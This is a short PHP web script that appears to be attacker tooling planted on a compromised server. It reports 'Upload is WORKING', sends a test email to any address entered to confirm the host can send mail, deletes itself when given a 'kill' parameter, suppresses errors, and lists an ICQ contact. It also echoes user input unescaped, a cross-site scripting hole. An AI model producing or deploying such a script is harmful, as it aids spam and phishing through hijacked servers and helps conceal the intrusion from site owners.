Upload is <b><color>WORKING</color></b>
<br>Checking  Mailling ..<br>
<form method="post">
<input placeholder = "name@exmple.com" type="email" name="email" value=""required >
<input type="submit" value="Send >>">
</form>

<?php
error_reporting(0);

if (!empty($_POST['email'])){
	$xx = rand();
	mail($_POST['email'],"Important Information - ".$xx,"WORKING !");
	print "<b>send an report to [".$_POST['email']."] - $xx</b> <br> <br>"; 
$jj =  basename($_SERVER['SCRIPT_NAME']);


	}
if(isset($_GET["kill"]))
    {
$jj =  basename($_SERVER['SCRIPT_NAME']);

if (!unlink($jj))
  {
  echo ("<br><br>php Files = '0' <br>");
  }
else
  {
  echo ("<br><br>php Files = '1' <br>");
  }
}
echo 'ICQ : 727974030'; 
?>